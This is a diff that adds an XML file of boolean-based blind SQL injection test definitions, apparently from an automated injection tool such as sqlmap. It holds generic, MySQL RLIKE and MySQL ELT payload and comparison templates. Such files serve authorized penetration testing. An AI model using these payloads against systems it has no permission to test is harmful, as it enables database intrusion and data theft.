@@ -1,0 +1,62 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<root>
+    <!-- Boolean-based blind tests - WHERE/HAVING clause -->
+    <test>
+        <title>AND boolean-based blind - WHERE or HAVING clause</title>
+        <stype>1</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND [INFERENCE]</vector>
+        <request>
+            <payload>AND [RANDNUM]=[RANDNUM]</payload>
+        </request>
+        <response>
+            <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+        <details>
+            <dbms>General dbms</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))</vector>
+        <request>
+            <payload>RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 0x28 END))</payload>
+        </request>
+        <response>
+            <comparison>RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 0x28 END))</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND ELT([INFERENCE],[RANDNUM])</vector>
+        <request>
+            <payload>AND ELT([RANDNUM]=[RANDNUM],[RANDNUM1])</payload>
+        </request>
+        <response>
+            <comparison>AND ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+</root>
